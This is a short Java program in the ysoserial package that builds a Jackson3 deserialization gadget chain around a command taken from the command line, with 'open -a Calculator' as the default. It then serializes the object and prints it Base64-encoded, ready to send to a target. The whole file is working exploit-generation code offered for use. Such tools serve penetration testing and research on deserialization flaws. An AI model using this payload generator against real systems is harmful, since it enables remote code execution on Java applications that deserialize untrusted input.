package ysoserial;

import ysoserial.payloads.Jackson3;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class GenJackson3 {
    public static void main(String[] args) throws Exception {
        String cmd = args.length > 0 ? args[0] : "open -a Calculator";
        Object payload = new Jackson3().getObject(cmd);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(payload);
        oos.close();
        System.out.println(Base64.getEncoder().encodeToString(bos.toByteArray()));
    }
}
